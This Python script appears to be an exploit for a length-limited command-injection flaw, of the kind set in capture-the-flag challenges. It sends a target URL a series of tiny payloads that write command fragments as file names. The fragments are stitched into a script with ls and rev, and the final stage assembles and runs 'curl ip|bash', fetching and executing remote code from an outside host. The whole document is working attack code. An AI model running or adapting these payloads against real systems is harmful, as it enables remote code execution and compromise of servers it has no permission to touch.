import time
import requests

#output ls -ht>g to v with reversed format
payload1 = [
    ">sl",
    ">ht-",
    ">g\>",
    ">g\;",
    ">dir",
    "*>v"
]
#reverse v
payload2 = [
    ">rev",
    "*v>x"
]
#curl ip|bash
payload3 = [
    ">ash",
    ">b\\",
    ">\|\\",
    "ip_base64",
    ">\ \\",
    ">rl\\",
    ">cu\\",
    "sh x"
]

url = ''
for i in payload1:
    requests.get(url+i)
    time.sleep(0.5)
print("phase1 done")
for i in payload2:
    requests.get(url+i)
    time.sleep(0.5)
print("phase2 done")
for i in payload3:
    requests.get(url+i)
    time.sleep(0.5)
print("phase3 done")
requests.get(url+"sh g")
time.sleep(0.5)